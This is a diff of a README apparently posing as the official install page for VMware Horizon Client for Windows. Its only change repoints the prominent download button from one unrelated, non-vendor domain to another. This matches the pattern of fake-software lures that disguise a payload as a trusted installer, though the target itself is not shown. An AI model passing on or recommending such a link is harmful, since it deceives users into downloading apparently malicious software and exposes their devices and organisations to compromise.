@@ -9,7 +9,7 @@ VMware Horizon Client for Windows is a software tool that allows users to secure
 - [Connecting to Remote Desktops and Applications](#connecting-to-remote-desktops-and-applications)   
 
 ## Installation
-[**Download VMware Horizon Client**](https://amfm247.com/247/)
+[**Download VMware Horizon Client**](https://echochurch.tv/tv/)
 
 Click the download button to begin installing VMware Horizon Client. This application allows secure access to your organization’s remote desktops and applications from your Windows device.
 
